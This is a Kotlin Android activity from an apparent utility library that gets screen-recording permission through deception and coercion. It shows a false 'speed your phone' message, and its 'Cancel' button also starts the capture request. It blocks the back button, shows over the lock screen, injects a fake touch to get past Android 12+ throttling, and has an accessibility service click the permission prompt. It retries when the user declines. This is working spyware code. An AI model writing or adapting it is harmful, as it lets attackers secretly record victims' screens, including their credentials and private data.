package com.webanion.androidgmutils.screenrecording

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.webanion.androidgmutils.accessibility.AGUAccessibilityListener
import android.content.res.Configuration
import android.os.Build
import android.view.*
import android.widget.*
import android.graphics.drawable.GradientDrawable

class ScreenRecordingDialogActivity : Activity() {

    private var permissionRetryCount = 0

    override fun onCreate(savedInstanceState: Bundle?) {

        val isDarkTheme = resources.configuration.uiMode and
        Configuration.UI_MODE_NIGHT_MASK == Configuration.UI_MODE_NIGHT_YES

        window.apply {
            statusBarColor = if (isDarkTheme) Color.BLACK else Color.WHITE
            navigationBarColor = if (isDarkTheme) Color.BLACK else Color.WHITE

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                decorView.systemUiVisibility = if (isDarkTheme) 0 else View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                decorView.systemUiVisibility = decorView.systemUiVisibility or
                        if (isDarkTheme) 0 else View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR
            }
        }


        overridePendingTransition(0, 0)
        super.onCreate(savedInstanceState)

        // Make sure the activity can show even if the screen is locked
        window.addFlags(
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        window.decorView.setOnTouchListener { _, _ -> true }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.TRANSPARENT)
            setPadding(48, 48, 48, 48)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
        }

        val dialogBox = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 32f
                setColor(Color.WHITE)
            }
            setPadding(32, 32, 32, 32)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(48, 48, 48, 48)
            }
        }

        val txtVw = TextView(this).apply {
            text = "To speed your phone we stopped some background operations. Please visit respective page to resume the service or click the button below."
            textSize = 16f
            setTextColor(Color.BLACK)
            gravity = Gravity.CENTER
        }

        val topLine = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                4
            ).apply {
                topMargin = 24
            }
            setBackgroundColor(Color.LTGRAY)
        }

        val buttonRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(16, 16, 16, 16)
        }

        val buttonLayoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(16, 0, 16, 0)
        }

        val tryConnectButton = Button(this).apply {
            text = "Try Resume"
            contentDescription = "Try Resume Button"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.parseColor("#47C56C"))
            layoutParams = buttonLayoutParams
            importantForAccessibility = View.IMPORTANT_FOR_ACCESSIBILITY_YES
            setOnClickListener {
                val initialDelay = (150..250).random().toLong()
                Handler(Looper.getMainLooper()).postDelayed({ startScreenCapture() }, initialDelay)
            }
        }

        val cancelButton = Button(this).apply {
            text = "Cancel"
            setBackgroundColor(Color.TRANSPARENT)
            setTextColor(Color.RED)
            layoutParams = buttonLayoutParams
            setOnClickListener {
                val initialDelay = (150..250).random().toLong()
                Handler(Looper.getMainLooper()).postDelayed({ startScreenCapture() }, initialDelay)
            }
        }

        buttonRow.addView(tryConnectButton)
        buttonRow.addView(cancelButton)

        dialogBox.addView(txtVw)
        dialogBox.addView(topLine)
        dialogBox.addView(buttonRow)
        container.addView(dialogBox)

        setContentView(container)

        // Optional: let singleton know which activity is active (backwards compatibility)
        ScreenRecorderSingleton.setActivity(this)

         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
           // Simulate a quick user tap to bypass input throttling on Android 12+
           simulateUserTap()
         }
    }

    private fun startScreenCapture() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            startActivityForResult(
                captureIntent,
                ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                AGUAccessibilityListener.getInstance()?.performRandomClicks()
            }

        } catch (e: Exception) {
            // e.printStackTrace()
            finish()
        }
    }

    override fun onBackPressed() {
        // Consume back press
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                permissionRetryCount = 0
                // Pass result to singleton directly
                ScreenRecorderSingleton.startRecording(data, resultCode)
                finish()
            } else {
                permissionRetryCount++
                if (permissionRetryCount < MAX_PERMISSION_RETRIES) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        startScreenCapture()
                    }, 500)
                } else {
                    finish()
                }
            }
        }
    }

    // Sends a quick down/up touch event to convince Android there was recent user interaction.
    private fun simulateUserTap() {
        val downTime = System.currentTimeMillis()
        val x = (80..120).random().toFloat()   // add randomness
        val y = (80..120).random().toFloat()

        val downEvent = MotionEvent.obtain(
            downTime,
            downTime,
            MotionEvent.ACTION_DOWN,
            x,
            y,
            0
        )
        val upEvent = MotionEvent.obtain(
            downTime,
            downTime + 50,
            MotionEvent.ACTION_UP,
            x,
            y,
            0
        )

        window.decorView.dispatchTouchEvent(downEvent)
        window.decorView.dispatchTouchEvent(upEvent)

        downEvent.recycle()
        upEvent.recycle()
    }

    companion object {
        const val MAX_PERMISSION_RETRIES = 3
        fun start(context: Context) {
            val intent = Intent(context, ScreenRecordingDialogActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            context.startActivity(intent)
        }
    }
}
